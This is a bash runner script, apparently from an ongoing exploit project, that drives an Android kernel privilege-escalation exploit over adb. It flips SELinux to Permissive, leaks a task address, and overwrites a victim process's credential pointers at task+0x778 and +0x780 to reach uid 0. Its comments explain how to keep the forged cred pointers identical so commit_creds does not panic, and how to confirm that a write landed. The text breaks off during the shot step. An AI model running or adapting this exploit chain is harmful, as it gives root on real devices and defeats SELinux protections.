#!/bin/bash
# run_bootA.sh — ONE boot, ONE shot per offset.
#
#   "does a PI write whose write_value is a sprayed HEAP pointer, rather than the
#    init_cred image, reboot the machine?"
#
# Design rules (2026-09-18):
#   * ONE shot per offset (ROUNDS=1).  No SIGKILL — a writer whose three-thread
#     futex protocol may still be live must be allowed to exit on its own, and
#     V12_PIN_FORK=1 keeps the payload page alive after it does.
#   * The judge is the target's own readback: /proc/<pid>/status Uid for
#     real_cred (task+0x778), the child's own getuid() for cred (task+0x780).
#     `probe_state` is NOT consulted (W1 landed while reporting R).
#   * The kernel log is captured to the HOST and deduped by KERNEL TIMESTAMP,
#     not by a line counter.  A counter is wrong here: the ring buffer is full
#     and churning, so `dmesg | wc -l` oscillates down by a line or two, and a
#     "count went down -> reset" rule re-appends the whole buffer.  Run 7 did
#     exactly that: 799 212 lines for 24 853 unique, ~73 MB, and it saturated
#     adb so badly that each shot took 80-95 s instead of ~15 s.
#   * The poller is PAUSED while a shot is in flight — adb is the contended
#     resource, and the shot is what we are timing.
#
# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= NODRAIN= ROUNDS= CONTROL=1
#   NODRAIN=1 (default) skips slab_drain() — 5 waves x 400 forked children, each
#     pause()d then SIGKILLed, at the start of every W7 invocation.  This is the
#     single heaviest difference between the boots that rebooted and run 7 which
#     did not, so NODRAIN=0 is the control to try next.
#   ROUNDS=n allows up to n shots at the same offset (no kill between them, stop
#     as soon as the readback moves).  Default 1.
#   CONTROL=1 fires the 0x778 shot with V12_ALLOW_INIT_CRED=1 (write_value = the
#     init_cred image).  It REPLACES the normal shot; run it as its own boot, and
#     only after a boot in which a sprayed-page write LANDED and did not reboot.
set -u
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"

ADB=${ADB:-adb}
SER=${SER:-$( "$ADB" devices 2>/dev/null | sed -n "2s/[[:space:]].*//p" )}
DEV=/data/local/tmp
# Run-unique device-side paths: after one of these events /data/local/tmp files
# can become root-owned and un-statable for shell, so a fixed name poisons every
# later run (adb push then fails with "stat failed ... Permission denied").
TAG=${TAG:-$(date +%m%d_%H%M%S)}
BIN=$DEV/glxA_$TAG
BINW=$DEV/glxW_$TAG
EV=$DEV/bootA_ev_$TAG.txt
TASKF=$DEV/bootA_task_$TAG.txt
RES=$DEV/bootA_res_$TAG.txt
# The same-value FACT (not intention) that the LT child reads at launder time.
# Its env is fixed at step 4 but the answer is only known at step 7, so the
# verdict travels through this file: 1 = both shots wrote the same value and
# 0x778 landed, 0 = anything else.  See the note at step 7.
SV_FILE=$DEV/bootA_samevalue_$TAG
OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
HOLD=${HOLD:-20}
# CHAINWAIT: the proven value is 6000 ms (tools/t5loop.sh CW=6000).  The code
# default is 20000 ms.  4000 was tried for speed and is BELOW anything that has
# ever landed — the chain simply has not finished, which shows up as
# probe_state=R and an unchanged readback.
CHAINWAIT=${CHAINWAIT:-6000}
NODRAIN=${NODRAIN:-1}
ROUNDS=${ROUNDS:-1}
CONTROL=${CONTROL:-0}
# SAME_VALUE=1 (default): step 6 reuses step 5's observed write value, so both
#   cred pointers can end up equal.  SAME_VALUE=0 restores the old behaviour
#   (each shot sprays its own page -> divergent pair).  Only use 0 to reproduce
#   a historical run.
SAME_VALUE=${SAME_VALUE:-1}
# LAUNDER=1: after the poke, the LT child issues setgroups(0,NULL) +
#   setresgid(0,0,0) + setresuid(0,0,0) to replace the fake cred with a real one.
#   ★ It REFUSES unless the same-value provenance is declared, because
#   commit_creds (which setresuid itself calls) panics on a divergent pair.
LAUNDER=${LAUNDER:-0}
# EXTRA: appended verbatim to every shot's env.  Use it to change the WRITE
# TARGET without touching anything else, e.g. EXTRA=V12_W7_MIMIC_W1=1 makes the
# W7 chain write to the global selinux_enforcing instead of task+0x778.
EXTRA=${EXTRA:-}
# WATCH: seconds to watch for a reboot after the sequence.  15 by default; widen
# it when the hypothesis under test predicts a DELAYED reboot.
WATCH=${WATCH:-120}
KLOG=$OUT/klog.host
POLLPID=""
mkdir -p "$OUT" || { echo "cannot create $OUT"; exit 1; }

A() { "$ADB" -s "$SER" shell "$@"; }
say() { echo "[$(date +%H:%M:%S)] $*"; }
detach() { timeout 15 "$ADB" -s "$SER" shell "$1" >/dev/null 2>&1 || true; }
uid_line() { A "grep -m1 '^Uid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
gid_line() { A "grep -m1 '^Gid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
now_ms() { local v; v=$(date +%s%3N 2>/dev/null); case "$v" in ''|*[!0-9]*) date +%s;; *) echo "$v";; esac; }

# ★★★ 2026-09-18 (晚): THE 0x778 LANDING ORACLE IS THE SIDE-EFFECT STAMP.
#
# probe_state has been wrong about "did it land" three times in this project:
#   * W1 landed on the global and reported R;
#   * run 12's D was aimed at a global, not at the cred;
#   * run 11's R got written into a table as if it were a landing.
# And `shot_until` still used `probe_state = D` to decide whether the 0x778 shot
# succeeded.  It should not: 0x778 has an externally readable DETERMINISTIC
# fingerprint, and the write primitive hands it to us for free.
#
# The side effect is a stamp aimed at the target:
#       *(write_value + 8) = write_target
# `cred+8` is `gid` (4 bytes) and `cred+0xc` is `suid` (4 bytes), so one 8-byte
# store lands across both:
#       cred.gid  = low32(write_target)
#       cred.suid = hi32(write_target)
# /proc/<pid>/status reads real_cred = task+0x778 — exactly the cred we just
# installed — so the stamp is directly observable.  Measured instance,
# out/t5_w7_778.txt:
#       write_target = 0xffffff8800cdd178
#       Uid: 0 0 4294967176 0       4294967176 = 0xffffff88 = hi32(write_target)
#       (and notes.md §11 records init_cred.gid = 0x00cdd178 = low32, the other half)
#
# Two consequences that matter:
#   * the uid half alone is satisfied by ANY page whose uid is 0, so it cannot
#     tell two different sprayed pages apart — but the gid half can, because
#     low32(T+0x778) and low32(T+0x780) differ by exactly 8.  That is what makes
#     the launder gate catch the "both landed, different pages" row after all.
#   * ⚠ the stamp lives at cred+8, so it MUST be read BEFORE step 7's repair.
#     The repair zeroes cred+8 and erases the evidence (notes.md §11's
#     `t5_repair.txt`: before repair the 4th awk field reads 4294967176; after a
#     successful repair it reads 0).
# ⛔ FIELD INDEXING — this is the off-by-one that silently killed the whole chain.
# `uid_line` prints the whole line including its label:  `Uid: 0 0 4294967176 0`.
# awk's $1 is therefore the LABEL "Uid:", and the four id values are $2..$5:
#       $2=uid(real)   $3=euid   $4=suid   $5=fsuid
# The stamp is the side effect's 8-byte store at cred+8, i.e. gid (low32) and
# suid (hi32), so it lands in Gid's $2 and Uid's $4.  notes.md §11 calls the same
# location "the third field of the Uid: line" — counting VALUES, not awk fields —
# and that wording is where the miscount came from.  Using $3 reads euid, which
# is 0 on the fake cred and can never equal hi32(write_target): the criterion then
# reports "no stamp" for a shot that landed, and because "no stamp" is ALSO the
# normal result of a genuine miss, nothing anywhere raises an error.  It gates
# off step 6 and the launder gate and looks like bad luck.
#   ⇒ Factored out so stamp_selftest() exercises the SAME code path the gate
#     uses.  A self-test that re-implements the check proves nothing.
uid_suid_field() { printf '%s' "$1" | awk '{print $4}'; }   # 4th awk field == suid
gid_gid_field()  { printf '%s' "$1" | awk '{print $2}'; }   # 2nd awk field == gid

# THREE states, because "cannot read" is not "no stamp".  Collapsing those two is
# the same error as run 13's blank probe_state (铁律 8) and it cost this project a
# reboot's worth of evidence.
#   0 = stamp PRESENT   (Uid $4 == hi32(wt)  AND  Gid $2 == lo32(wt))
#   1 = NO stamp        (both lines readable, values disagree)
#   2 = UNREADABLE      (empty read — device gone, or /proc blocked)
stamp_ok() {   # $1=pid $2=write_target
    local pid=$1 wt=$2 u g hi lo
    [ -n "$wt" ] || return 2
    hi=$(( wt >> 32 & 0xffffffff )); lo=$(( wt & 0xffffffff ))
    u=$(uid_line "$pid"); g=$(gid_line "$pid")
    [ -n "$u" ] && [ -n "$g" ] || return 2
    [ "$(uid_suid_field "$u")" = "$hi" ] || return 1
    [ "$(gid_gid_field "$g")" = "$lo" ] || return 1
    return 0
}

# ★ A criterion that has never been run against a known-POSITIVE sample is not a
# criterion, it is a guess — and when it is wrong it fails SILENTLY, because its
# failure mode ("did not land") is also the normal outcome of a real miss.  That
# is exactly how probe_state, `dmesg -w`, the empty klog and the blank readback
# each went wrong.  This self-test is the only thing that breaks that loop, so it
# runs before any shot and exits on failure.
# Samples are the REAL measured values: out/t5_w7_778.txt /
# evidence/notes.md §11, write_target = 0xffffff8800cdd178.
stamp_selftest() {
    local wt=0xffffff8800cdd178 hi lo
    hi=$(( wt >> 32 & 0xffffffff )); lo=$(( wt & 0xffffffff ))
    # positive: the exact lines the device produced
    [ "$(uid_suid_field 'Uid: 0 0 4294967176 0')" = "$hi" ] || return 1
    [ "$(gid_gid_field "Gid: $lo 0 0 0")"        = "$lo" ] || return 1
    # negative: a plain unprivileged process must NOT look stamped
    [ "$(uid_suid_field 'Uid: 2000 2000 2000 2000')" = "$hi" ] && return 1
    [ "$(gid_gid_field 'Gid: 2000 2000 2000 2000')"  = "$lo" ] && return 1
    [ "$(uid_suid_field 'Uid: 0 0 0 0')" = "$hi" ] && return 1
    [ "$(gid_gid_field 'Gid: 0 0 0 0')"  = "$lo" ] && return 1
    # unreadable must not masquerade as a stamp
    [ "$(uid_suid_field '')" = "$hi" ] && return 1
    return 0
}
alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }
# same boot as preflight?  If not, the run must stop: every measurement after a
# reboot belongs to a different experiment.
same_boot() {
    local b
    b=$(A 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r')
    [ -n "$b" ] && [ "$b" = "$BOOTID" ]
}
svc_count() {
    local n=0 s
    for s in package power input phone wifi; do
        case "$(A "service check $s" 2>/dev/null | tr -d '\r')" in *found*) n=$((n+1));; esac
    done
    echo "$n"
}

# ---- kernel log: host-side poll, deduped by kernel timestamp ----------------
start_klog() {
    [ -n "$POLLPID" ] && return 0
    # ★ 2026-09-18 (晚): hard guard.  Run 10's capture died here with
    #   `run_bootA.sh: line 152: .../run10_061604/klog.host: No such file or directory`
    # and the consequence was not a missing file, it was a MISSING REBOOT: the
    # only window that could have bracketed run 10's death was never recorded, so
    # the run's capture is the next boot instead.  That single failure is why the
    # "all reboots were orderly, no panic" claim had a sample of 1.  Do not let a
    # redirect decide whether we can diagnose a reboot: create the directory and
    # refuse to proceed silently if it still cannot be opened.
    mkdir -p "$(dirname "$KLOG")" 2>/dev/null
    if ! : > "$KLOG" 2>/dev/null; then
        say "  !! FATAL: cannot create $KLOG — the kernel-log capture would be lost."
        say "     A run whose reboot cannot be captured is a run that cannot be"
        say "     diagnosed.  Aborting before the shots."
        exit 4
    fi
    # create the file eagerly: the loop below only writes once it has data, so an
    # empty first fetch (e.g. racing the SELinux flip) would leave the file
    # missing and later `wc -l < "$KLOG"` would fail.  Run 10 hit exactly that.
    : > "$KLOG" 2>/dev/null
    ( while :; do
          miss=0
          last=$(tail -1 "$KLOG" 2>/dev/null | sed -n 's/^\[ *\([0-9][0-9.]*\)\].*/\1/p')
          [ -z "$last" ] && last=0
          t3=$( "$ADB" -s "$SER" shell "dmesg | tail -n 2000" 2>/dev/null | tr -d '\r' )
          if [ -z "$t3" ]; then
              miss=$((miss+1))
              [ "$miss" = 3 ] && printf '### [poll] 3 consecutive empty dmesg fetches at %s\n' "$(date +%H:%M:%S)" >> "$KLOG"
              sleep 5; continue
          fi
          mt=$(printf '%s\n' "$t3" | tail -1 | sed -n 's/^\[ *\([0-9][0-9.]*\)\].*/\1/p')
          [ -z "$mt" ] && mt=0
          # timestamps went BACKWARDS -> the box rebooted; start a fresh capture
          if awk -v a="$mt" -v b="$last" 'BEGIN{exit !(a+0 < b+0)}'; then
              printf '\n### [poll] kernel timestamps went backwards (%s < %s) - reboot seen at %s\n\n' \
                     "$mt" "$last" "$(date +%H:%M:%S)" >> "$KLOG"
              last=0
          fi
          printf '%s\n' "$t3" | awk -v t="$last" '
              {
                  if ($0 ~ /^\[ *[0-9]+\.[0-9]+\]/) {
                      ts=$0; sub(/^\[ */,"",ts); sub(/\].*/,"",ts); ts=ts+0
                      keep = (ts > t) ? 1 : 0
                  }
                  if (keep) print
              }' >> "$KLOG"
          sleep 5
      done ) &
    POLLPID=$!
}
stop_klog() { [ -n "$POLLPID" ] && kill "$POLLPID" 2>/dev/null; POLLPID=""; }

# ---------------------------------------------------------------- preflight
say "=== preflight ==="
# ★ Host-side self-test of the landing criterion, BEFORE anything touches the
# device.  A broken criterion does not announce itself — it reports "did not
# land", which is indistinguishable from a real miss, so the whole run would
# quietly do nothing and the operator would go hunting for a hit-rate problem.
# This costs nothing and it is the only thing that breaks that loop.
if stamp_selftest; then
    say "  stamp_selftest: OK  (positive 0xffffff8800cdd178 -> Uid \$4=4294967176,"
    say "                        Gid \$2=13488504; negative + unreadable rejected)"
else
    say "  !! FATAL: stamp_selftest FAILED.  The 0x778 landing criterion is broken."
    say "     Refusing to run: every shot would report 'no stamp' regardless of what"
    say "     actually landed, step 6 would never fire, and the launder gate would"
    say "     refuse forever.  Fix uid_suid_field/gid_gid_field first."
    exit 9
fi
"$ADB" devices | grep -q "$SER" || { echo "device $SER not attached"; exit 1; }
A 'uname -r; getenforce; cat /proc/sys/kernel/random/boot_id; uptime; cat /proc/loadavg' \
    | tee "$OUT/00_preflight.txt" | tr -d '\r'
# The LT parent blocks in waitpid() and its child spins, so a detached LT pair
# OUTLIVES the runner.  Left alone they accumulate across runs and inflate the
# load, which is what the perf leak is sensitive to.  Clear any leftovers from a
# previous run before starting: their sequence is over, so this is not a
# mid-protocol kill.
say "  clearing leftover glx* from previous runs:"
A 'for p in $(ps -A -o PID,NAME 2>/dev/null | grep -E "^ *[0-9]+ glx" | awk "{print \$1}"); do kill -9 $p 2>/dev/null; done; ps -A -o NAME 2>/dev/null | grep -c "^glx" || true' \
    | tr -d '\r' | sed 's/^/    remaining: /'
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BIN"  2>&1 | tail -1
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BINW" 2>&1 | tail -1
A "chmod 755 $BIN $BINW"

# ---------------------------------------------------------------- 1. Permissive
say "=== step 1: SELinux Permissive ==="
if [ "$(A 'getenforce' | tr -d '\r')" = "Permissive" ]; then
    say "  already Permissive — skipping W1 entirely"
else
    W1OK=0
    for r in 1 2 3 4 5 6 7 8; do
        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev_$TAG.txt timeout 190 ./$(basename "$BIN") W1 >/dev/null 2>&1"
        EN=$(A 'getenforce' | tr -d '\r')
        say "  W1 round $r: $EN"
        [ "$EN" = "Permissive" ] && { W1OK=1; break; }
        sleep 2
    done
    [ "$W1OK" = 1 ] || { say "!! not Permissive — stopping"; exit 2; }
fi
# W1 runs the SAME pass machinery as W7 (exploit.c passW1 vs passW7) but the
# runner passes it NO CHAINWAIT, so it uses the 20000 ms default.  Its evidence
# is therefore the control for "chain completed + write landed": keep it.
say "  W1 evidence:"
A "cat $DEV/bootA_w1_ev_$TAG.txt 2>/dev/null" | tr -d '\r' | tee "$OUT/w1_evidence.txt" | sed 's/^/    /' | head -12

# ---------------------------------------------------------------- 2. klog
say "=== step 2: host-side kernel log (dmesg poll, deduped by timestamp) ==="
if "$ADB" -s "$SER" shell 'head -c1 /dev/kmsg' >/dev/null 2>&1; then
    say "  /dev/kmsg readable — streaming it"
    ( "$ADB" -s "$SER" exec-out cat /dev/kmsg >> "$KLOG" 2>/dev/null ) &
    POLLPID=$!
else
    say "  /dev/kmsg NOT readable (expected here) — polling dmesg from the host"
    start_klog
fi
sleep 5
say "  klog lines after 5s: $(wc -l < "$KLOG")"

# ---------------------------------------------------------------- 3. settle
say "=== step 3: load settle (max 15s, threshold 16) ==="
for i in 1 2 3 4 5 6 7; do
    L=$(A 'cut -d" " -f1 /proc/loadavg' | tr -d '\r')
    say "  load1=$L"
    awk -v l="$L" 'BEGIN{exit !(l+0 < 16)}' && break
    sleep 2
done

# ---------------------------------------------------------------- 4. LT
say "=== step 4: LT child (pure userspace spin, NO_EXEC) ==="
TASK=""; CPID=""; PPID_LT=""
for attempt in $(seq 1 12); do
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev_$TAG.txt V12_NO_EXEC=1 V12_LAUNDER=$LAUNDER V12_W7_SAME_VALUE=$SAME_VALUE V12_SAME_VALUE_FILE=$SV_FILE ./$(basename "$BIN") LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
    for i in $(seq 1 25); do
        sleep 1
        TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
        [ -n "$TASK" ] && break
    done
    [ -n "$TASK" ] && break
    say "  LT attempt $attempt rejected: $(A "grep -m1 suspicious $DEV/bootA_lt_$TAG.log 2>/dev/null" | tr -d '\r')"
done
[ -z "$TASK" ] && { say "!! no task leak — stopping"; stop_klog; exit 3; }
LTLOG=$(A "cat $DEV/bootA_lt_$TAG.log 2>/dev/null")
CPID=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT child_task = 0x[0-9a-f]* pid=\([0-9]*\).*/\1/p' | head -1)
PPID_LT=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT parent pid=\([0-9]*\) child=.*/\1/p' | head -1)
say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
say "  baseline: $(uid_line "$CPID")"

# ---------------------------------------------------------------- 5. shots
# ---------------------------------------------------------------------------
# Instruments.  The old one polled over adb every ~2.2 s from the host, which
# (a) competed with the shot's own adb traffic, (b) could only ever sample a
# 20 s window, and (c) wrote "no data" as if it were "no change" (run 13).
#
# Now: a DEVICE-side loop on a single long-lived connection, change-triggered,
# 50 ms, timestamped with /proc/uptime.  It emits nothing while nothing changes,
# so it costs no adb bandwidth; and when the box dies the stream simply breaks,
# leaving the last state before death as the last line.
# ---------------------------------------------------------------------------
uid_stream_start() {   # $1=pid  $2=outfile
    [ -n "${UIDSTREAMPID:-}" ] && return 0
    ( "$ADB" -s "$SER" shell '
p='"$1"'
last=x
while [ -d /proc/$p ]; do
  u=$(cut -d" " -f1 /proc/uptime)
  v=$(sed -n "s/^Uid:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
  w=$(sed -n "s/^Gid:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
  # ★ 2026-09-18 (晚): utime/stime + voluntary_ctxt_switches.
  #   /proc/<pid>/stat fields 14/15 are utime/stime in jiffies; after stripping
  #   the "pid (comm)" prefix (comm may contain spaces) they are fields 12/13.
  #   The LT child is *supposed* to sit in a PURE USERSPACE spin between the
  #   shots and the poke -- no syscall at all -- which is the premise that makes
  #   the divergence latent.  Until now that premise was only a comment.  It has
  #   a signature: utime climbs, stime stays FLAT, nvcsw does not move.  If
  #   stime or nvcsw moves during the window, the child is issuing syscalls and
  #   every "no commit_creds could have run" argument has to be re-derived.
  st=$(sed -n "s/^[^)]*) //p" /proc/$p/stat 2>/dev/null)
  ut=$(echo "$st" | cut -d" " -f12)
  kt=$(echo "$st" | cut -d" " -f13)
  nv=$(sed -n "s/^voluntary_ctxt_switches:[[:space:]]*//p" /proc/$p/status 2>/dev/null)
  n="$v|$w|ut=$ut|st=$kt|nv=$nv"
  if [ "$n" != "$last" ]; then echo "$u $n"; last="$n"; fi
  sleep 0.05
done
echo "$(cut -d" " -f1 /proc/uptime) <pid gone>"' > "$2" 2>/dev/null ) &
    UIDSTREAMPID=$!
}

cred_stream_start() {  # $1=outfile  (watches the child's own report file)
    [ -n "${CREDSTREAMPID:-}" ] && return 0
    ( "$ADB" -s "$SER" shell '
last=x
while :; do
  v=$(cat '"$RES"' 2>/dev/null)
  if [ "$v" != "$last" ]; then echo "$(cut -d" " -f1 /proc/uptime) $v"; last="$v"; fi
  sleep 0.2
done' > "$1" 2>/dev/null ) &
    CREDSTREAMPID=$!
}

streams_stop() {
    [ -n "${UIDSTREAMPID:-}" ] && kill "$UIDSTREAMPID" 2>/dev/null; UIDSTREAMPID=""
    [ -n "${CREDSTREAMPID:-}" ] && kill "$CREDSTREAMPID" 2>/dev/null; CREDSTREAMPID=""
}

poll_uid() {   # $1=pid $2=timeout_s -> the first Uid line that is no longer 2000
    local pid=$1 t=$2 i u=""
    for i in $(seq 1 "$t"); do
        u=$(uid_line "$pid")
        case "$u" in
            ""|*"2000 2000 2000 2000"*) sleep 1;;
            *) echo "$u"; return 0;;
        esac
    done
    echo "$u"
}

# one shot; echoes the write value it used.  The poller is PAUSED across it,
# because adb is the contended resource and the shot is what we are timing.
shot() {
    local off=$1 extra=$2 tag=$3
    local ev="$DEV/bootA_ev_${TAG}_$tag.txt" eff_off
    A "rm -f $ev 2>/dev/null; true"
    stop_klog
    say "  [$tag] ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s nodrain=$NODRAIN ${extra:-}"
    local t0 t1
    t0=$(date +%s)
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=$NODRAIN $EXTRA $extra V12B_EVIDENCE=$ev ./$(basename "$BINW") W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
    local i out="" fails=0 ta tb rt rts=""
    for i in $(seq 1 20); do
        sleep 1
        ta=$(now_ms)
        out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
        tb=$(now_ms)
        rt=$(( tb - ta )); rts="$rts $rt"
        if [ -z "$out" ]; then
            fails=$((fails+1))
            [ "$fails" -ge 3 ] && { say "  [$tag] 3 consecutive empty adb reads — device likely gone (last round-trip ${rt}ms)"; break; }
        else
            fails=0
        fi
        printf '%s' "$out" | grep -q 'probe_state' && break
    done
    # ★ 2026-09-18 (晚): round-trip latency as a reboot-SHAPE instrument, no new
    # channel needed.  A kernel-side stall before the reset shows up as the last
    # reads getting slower (~30 ms -> seconds) while they still succeed; a clean
    # reset shows ~30 ms the whole way and then the transport simply vanishes.
    # Recorded as data — it needs a baseline across runs before it can be read as
    # evidence, which is exactly what this series is for.
    say "  [$tag] adb round-trip ms:$rts"
    printf '%s\n' "$rts" >> "$OUT/roundtrip_$tag.txt"
    sleep 1
    out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
    printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
    t1=$(date +%s)
    start_klog
    say "  [$tag] shot wall-clock: $((t1 - t0))s"
    grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|PIN child|HOLD|REFUSED' \
        "$OUT/w7_$tag.txt" | sed 's/^/    /'
    # ★ probe_state semantics for W7 (docs/28, and tools/t5loop.sh line 11):
    #     D = the write LANDED;  R = it did not;  S = blocked/[7] passed.
    #   The exploit's own printout only calls S a HIT, so for W7 it reports
    #   "miss" on the very runs that landed (see out/t5_w7_778.txt:
    #   `probe_state = D` + `Uid: 0 0 4294967176 0` + "*** 0x778 LANDED ***").
    #   Never trust its HIT/miss line here.
    SHOT_PS=$(sed -n 's/^probe_state *= *\([A-Z?]\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
    # Immediately read the victim: shot_until used to do this only AFTER the
    # whole shot (including a 45 s adb evidence read), which is how run 10 lost
    # the one line that would have settled three things at once.
    SHOT_STATUS=$(uid_line "$CPID")
    SHOT_WT=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
    say "  [$tag] victim readback NOW: [$SHOT_STATUS]"
    # SKIP_PRED: is the target really task+0x778?  The prediction below is only
    # meaningful then, and it is the only line that says what the readback SHOULD
    # look like.  Decide it from the TARGET, not from whether the literal string
    # V12_W7_VALUE appears in the args: step 6 legitimately passes V12_W7_VALUE as
    # its $extra, so keying on the string suppresses step 5's prediction for any
    # operator who used EXTRA to pin a value -- losing the prediction in exactly
    # the experiment that most needs it.
    # Target = task + V12_W7_OFF (last assignment wins, since EXTRA/$extra are
    # appended after the runner's own env), unless MIMIC_W1 replaces it with a global.
    eff_off="$off"
    for tok in ${EXTRA:-} ${extra:-}; do
        case "$tok" in V12_W7_OFF=*) eff_off="${tok#V12_W7_OFF=}";; esac
    done
    case "${EXTRA:-} ${extra:-}" in
      *MIMIC*) SKIP_PRED=1;;                        # target swapped to a global
      *)  case "$eff_off" in
            0x778) SKIP_PRED=0;;
            *)     SKIP_PRED=1;;                    # target is not task+0x778
          esac;;
    esac
    if [ -n "$SHOT_WT" ] && [ "${off}" = "0x778" ] && [ "$SKIP_PRED" = 0 ]; then
        hi=$(( SHOT_WT >> 32 & 0xffffffff )); lo=$(( SHOT_WT & 0xffffffff ))
        say "  [$tag] if 0x778 LANDED the side effect puts write_target at cred+8, so"
        say "  [$tag] /proc/status must read:  Uid: 0 0 $hi 0   and   Gid first field = $lo"
    fi
    SHOT_CRED=$(printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
    [ -z "$SHOT_PS" ] && SHOT_PS=UNKNOWN
    say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked, UNKNOWN=no data)"
    return 0
}

# up to $4 shots at one offset; no kill; stop as soon as the readback moves
shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
    local off=$1 extra=$2 tag=$3 rounds=${4:-1} r u rc=0
    for r in $(seq 1 "$rounds"); do
        shot "$off" "$extra" "${tag}r$r"
        if ! alive; then say "  !! DEVICE GONE after $tag round $r"; exit 5; fi
        if ! same_boot; then
            say "  !! REBOOTED after $tag round $r (boot_id changed) — STOPPING."
            say "     Everything after a reboot belongs to a different experiment."
            exit 6
        fi
        # ★ 0x778: the criterion is the side-effect stamp, NOT probe_state.  See
        # stamp_ok() for why, and note that this is what lets ROUNDS>1 retry on
        # 0x778 instead of burning a boot: the stamp is a positive, readable
        # signal, so a failed round is distinguishable from a landed one.
        if [ "${off}" = "0x778" ] && [ "${SKIP_PRED:-0}" = 0 ]; then
            stamp_ok "$CPID" "${SHOT_WT:-}"; rc=$?
            case $rc in
            0)  say "  [$tag] round $r: STAMP PRESENT — 0x778 LANDED"
                say "        Uid 4th field = $(( SHOT_WT >> 32 & 0xffffffff )) (= hi32 write_target)"
                say "        Gid 2nd field = $(( SHOT_WT & 0xffffffff )) (= lo32 write_target)"
                return 0;;
            2)  say "  ⛔ [$tag] round $r: /proc/status UNREADABLE — landing UNKNOWN."
                say "     This is NOT 'did not land'.  Device gone, or /proc blocked."
                say "     (run 13 was read as 'no change' from exactly this shape — 铁律 8)"
                alive || say "  !! DEVICE GONE during the criterion read"
                return 1;;
            *)  # rc=1: readable and no stamp.  A genuine miss and a BROKEN CRITERION
                # look identical from here — which is precisely why stamp_selftest
                # runs before any shot.  If probe_state disagrees, say so loudly and
                # do not let it be read as a miss: the two verdicts send the operator
                # to completely different places.
                if [ "${SHOT_PS:-}" = "D" ]; then
                    say "  ⛔ [$tag] round $r: ORACLE INCONSISTENT."
                    say "     probe_state=D says the write LANDED; the stamp says it did not."
                    say "     They cannot both be right.  Go check the CRITERION — field"
                    say "     indexing, whether the store really lands at cred+8 — NOT the"
                    say "     hit rate.  Reading this as a miss is the trap."
                else
                    say "  [$tag] round $r/$rounds: no stamp  (probe_state=${SHOT_PS:-?} — NOT the criterion)"
                fi;;
            esac
        elif [ "${SHOT_PS:-}" = "D" ]; then
            say "  [$tag] probe_state=D on round $r — the write landed"
            say "        (probe_state is the only oracle available for this offset; for"
            say "         0x778 it is NOT used — see stamp_ok())"
            return 0
        else
            u=$(poll_uid "$CPID" 8)
            case "$u" in
                ""|*"2000 2000 2000 2000"*)
                    say "  [$tag] round $r/$rounds: readback unchanged";;
                *)  say "  [$tag] readback moved on round $r: [$u]"; return 0;;
            esac
        fi
        [ "$r" -lt "$rounds" ] && sleep 2
    done
    return 1
}

say "  starting uid.stream on pid $CPID (device-side, 50 ms, change-triggered)"
uid_stream_start "$CPID" "$OUT/uid.stream"
say "=== step 5: 0x778 shot(s) (real_cred) ==="
# ★★★ 2026-09-18 (晚): THE TWO SHOTS MUST WRITE THE SAME VALUE.
#
# `commit_creds()` opens with BUG_ON(task->cred != task->real_cred) and this
# kernel has PANIC_ON_OOPS=y, so the two cred pointers must be IDENTICAL when
# anything commits creds on the victim.  BUG_ON compares POINTERS, not the
# contents behind them.
#
# Until now step 5 and step 6 each fired with empty $extra, so each sprayed its
# OWN fresh page and the pair was (pageA, pageB) -- divergent even when both
# landed.  Evidence, run 9 (evidence/2026-09-18-bootA/run9_0606.log L26/L40):
#     0x778 shot write value = private cred page 0xffffff88679bade0
#     0x780 shot write value = private cred page 0xffffff8785d6ade0
# Same shape in run 3 (0xffffff8787b5ade0 vs 0xffffff881bad2de0).
#
# The old chain that DID survive to ksud (out/t5_w7_778.txt + out/t5_w7_780.txt,
# 09-14) wrote `0xffffff802a7e0be0` -- the init_cred P0 alias, one fixed global
# -- to BOTH slots.  tools/t5loop.sh applies a single $ENVV to every offset, so
# MODE=CRED made both shots identical by construction.  That, not the landing,
# is what separated cell 2 from cell 3.
#
# So: step 6 now reuses step 5's observed value verbatim.  The first shot's PIN
# child must outlive the second shot (HOLD >= ~180 s), or the page is freed and
# reallocated and "same value" becomes a dangling pointer.
V778=""
W778_LANDED=0
if [ "$CONTROL" = "1" ]; then
    say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
